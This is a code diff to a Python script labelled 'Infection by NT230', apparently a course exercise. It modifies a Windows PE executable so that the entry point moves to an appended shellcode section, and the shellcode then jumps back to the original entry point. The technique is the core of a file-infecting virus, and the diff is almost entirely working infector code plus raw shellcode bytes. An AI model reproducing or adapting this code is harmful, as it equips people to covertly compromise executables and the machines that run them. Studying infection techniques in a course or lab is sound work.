@@ -3,7 +3,7 @@
 import sys
 import pefile
 import argparse
-
+import mmap, os, struct
 # CLI Argument Inputs
 parser = argparse.ArgumentParser(description='Infection by NT230')
 parser.add_argument('--file','-fileInfection', dest='file')
@@ -49,6 +49,14 @@ file = args.file
 # Load to pefile object
 pe = pefile.PE(file)
 
+number_of_section = pe.FILE_HEADER.NumberOfSections
+last_section = number_of_section - 1
+new_entry_point = pe.sections[last_section].VirtualAddress
+old_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
+pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point
+return_entry_point = old_entry_point + pe.OPTIONAL_HEADER.ImageBase
+
+ret = struct.pack('<L', return_entry_point)
 shellcode = bytes(
 b""
 b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
@@ -73,7 +81,7 @@ b"\xe3\x68\x31\x36\x58\x20\x68\x35\x32\x32\x30\x68\x32"
 b"\x2d\x32\x30\x68\x32\x31\x38\x36\x68\x2d\x32\x30\x35"
 b"\x68\x31\x39\x37\x38\x68\x32\x30\x35\x32\x31\xc9\x88"
 b"\x4c\x24\x1a\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff"
-b"\xd0\x52\x53\x51\x52\xff\xd0\x90"
+b"\xd0\xb8" + ret + b"\xff\xd0"
 )
 
 # Save file to variable
